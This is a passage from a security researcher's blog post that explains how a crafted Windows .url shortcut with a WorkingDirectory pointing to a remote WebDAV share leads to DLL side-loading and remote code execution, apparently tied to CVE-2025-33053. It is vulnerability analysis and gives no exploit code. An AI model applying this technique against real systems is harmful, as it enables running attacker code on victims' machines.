</a>Why it works?</div></h2><p>When a user interacts with a <code>.url</code> file in Windows, a series of internal processes are triggered that can be leveraged to execute code from a remote location, such as a WebDAV share. This analysis breaks down the internal mechanisms of Windows that enable this, focusing on the WorkingDirectory parameter and the role of WebDAV in loading executables.</p><h3 id=the-execution-flow-of-a-url-file><div><a href=#the-execution-flow-of-a-url-file>##
</a>The Execution Flow of a .url File</div></h3><p>The process begins when a user double-clicks a <code>.url</code> file. This action is handled by the Windows Shell, which uses the <code>ShellExecute</code> or <code>ShellExecuteEx</code> API functions from the <code>shell32.dll</code> library to process the file. <code>ShellExecuteEx</code> is a versatile function that can open or perform actions on any file type by identifying the default handler registered for that file&rsquo;s extension in the Windows Registry. For <code>.url</code> files, the registered handler is typically the Internet Shortcut file type. The shell then parses the contents of the <code>.url</code> file, which is a plain text file containing sections and key-value pairs. A specially crafted <code>.url</code> file can be used to launch a local executable instead of opening a web page.</p><h3 id=the-role-of-shellexecuteex-and-createprocessw><div><a href=#the-role-of-shellexecuteex-and-createprocessw>##
</a>The Role of ShellExecuteEx and CreateProcessW</div></h3><p>The <code>ShellExecuteEx</code> function uses a <code>SHELLEXECUTEINFO</code> structure to manage the execution. Key members of this structure in this context are:</p><pre tabindex=0><code>lpFile: The path to the .url file itself.
lpDirectory: This sets the working directory for the new process.
nShow: Controls how the application&#39;s window is displayed (e.g., minimized, hidden).
</code></pre><p><code>ShellExecuteEx</code> ultimately calls the <code>CreateProcessW</code> function to create a new process. <code>CreateProcessW</code> provides more granular control over the new process&rsquo;s creation. The parameters from the <code>.url</code> file and the <code>SHELLEXECUTEINFO</code> structure are passed to <code>CreateProcessW</code>.</p><h3 id=the-significance-of-the-workingdirectory-parameter><div><a href=#the-significance-of-the-workingdirectory-parameter>##
</a>The Significance of the WorkingDirectory Parameter</div></h3><p>The <code>WorkingDirectory</code> parameter within the <code>[InternetShortcut]</code> section of the <code>.url</code> file is crucial in this process. When the Windows Shell parses the <code>.url</code> file, it reads the value of <code>WorkingDirectory</code> and uses it to populate the <code>lpDirectory</code> member of the <code>SHELLEXECUTEINFO</code> structure. This value is then passed to the <code>lpCurrentDirectory</code> parameter of the <code>CreateProcessW</code> function. By setting the <code>WorkingDirectory</code> to a remote WebDAV share (e.g., <code>\\192.168.10.10\webdav</code>), an attacker can control the current directory of the newly created process. This has significant implications for how Windows loads required libraries.</p><h3 id=windows-dll-search-order-and-side-loading><div><a href=#windows-dll-search-order-and-side-loading>##
</a>Windows DLL Search Order and Side-Loading</div></h3><p>When a Windows application starts, it loads necessary Dynamic-Link Libraries (DLLs). The operating system searches for these DLLs in a specific order:</p><p>&ndash; The directory from which the application is loaded.</p><p>&ndash; The current directory for the process.</p><p>&ndash; The 32-bit Windows system directory (typically <code>C:\Windows\System32</code>).</p><p>&ndash; The 16-bit Windows system directory.</p><p>&ndash; The Windows directory (typically <code>C:\Windows</code>).</p><p>&ndash; The directories listed in the <code>PATH</code> environment variable.</p><p>The <code>WorkingDirectory</code> parameter directly influences the second step in this search order. By setting the current directory to a remote WebDAV share, an attacker can place a malicious DLL on that share with the same name as a legitimate DLL required by the application. When the application attempts to load the DLL, it will find and load the malicious version from the WebDAV share before it finds the legitimate version in the system directories. This is known as <strong>DLL side-loading</strong>.</p><h3 id=webdav-and-remote-execution><div><a href=#webdav-and-remote-execution>##
</a>WebDAV and Remote Execution</div></h3><p>The ability to load an executable or DLL from a WebDAV share as if it were on the local filesystem is facilitated by the <code>WebClient</code> service in Windows. The <code>WebClient</code> service allows Windows to access files on the internet using the <code>WebDAV</code> protocol. It runs within a <code>svchost.exe</code> process and relies on other services like <code>MRxDAV</code> (the WebDAV redirector). When an application, with its working directory set to a WebDAV share, requests to load a DLL, the WebClient service handles the request, retrieving the file from the remote server and providing it to the application&rsquo;s process. This allows the malicious DLL to be loaded into the memory of the legitimate process, effectively executing the attacker&rsquo;s code in the context of a trusted application</p><h2 id=references><div><a href=#references>#
</a>References:</div></h2><ol><li><a href=https://winbindex.m417z.com/>Windows Binary Index</a></li><li><a href=https://research.checkpoint.com/2025/stealth-falcon-zero-day/>CheckPoint Research - Stealth Falcon 0-day</a></li><li><a href=https://www.kaspersky.co.in/blog/cve-2025-33053-june-2025-patch-tuesday/28949/>Kaspersky Blogs on CVE-2025-33053</a></li></ol></div></article><div class="pagination post-pagination"><div class="left pagination-item disabled"></div><div class="right pagination-item"><a href=/blog/peculiar_pentest_scenes_1/>Peculiar Pentest Scenes - Client-side HTTP Encryption Folly</a></div></div><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//https-arkaprabhaachakraborty-github-io.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
<script src=/js/script.min.f2a82ecf59b1afe4e9c2be2c418e428efc4a96b7e9f39f7e3b9f41f13b17248c.js type=text/javascript integrity="sha256-8qguz1mxr+Tpwr4sQY5CjvxKlrfp859+O59B8TsXJIw="></script><script type=module>
            function detectCurrentScheme3() {
                    const defaultTheme = "auto";
                    if (localStorage !== null && localStorage.getItem("user-color-scheme")) {
                            return localStorage.getItem("user-color-scheme");
                    }
                    if (defaultTheme === "dark" || defaultTheme === "light") {
                            return defaultTheme;
                    }
                    return window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
            }

            import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs';
            window.mermaid = mermaid;
            window.initMermaid()
            document.body.dispatchEvent(new CustomEvent(detectCurrentScheme3() + "-theme-set"));
        </script></main><footer class="common-footer noselect"><div class=common-footer-bottom><div style=display:flex;align-items:center;gap:8px>¬© Arkaprabha Chakraborty, 2025</div><div style=display:flex;align-items:center></div><div>Powered by <a target=_blank rel="noopener noreferrer" href=https://gohugo.io/>Hugo</a>, theme <a target=_blank rel="noopener noreferrer" href=https://github.com/Junyi-99/hugo-theme-anubis2>Anubis2</a>.<br></div></div><p class="h-card vcard"><a href=https://arkaprabhachakraborty.github.io/ class="p-name u-url url fn" rel=me>map[email:arkaprabhachakraborty2001@gmail.com location:India name:Arkaprabha Chakraborty]</a></p></footer></div></body></html>